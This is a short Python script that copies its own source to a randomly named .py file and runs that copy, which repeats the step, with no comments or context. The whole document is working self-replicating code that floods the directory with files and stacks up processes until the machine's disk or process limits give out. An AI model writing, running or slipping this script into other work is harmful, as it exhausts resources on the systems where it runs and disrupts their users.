import os; 
import string; 
import random; 
from subprocess import call; 

create_string = (lambda: "".join([random.choice(string.ascii_letters) for x in range(random.randint(5, 20))])); 

file = open(__file__, 'r'); 
data = file.read(); 
filename = f"{create_string()}.py"; 
file = open(filename, 'x');
file.close(); 
file = open(filename, 'w'); 
file.write(data); file.close(); 
call(["python", filename]);
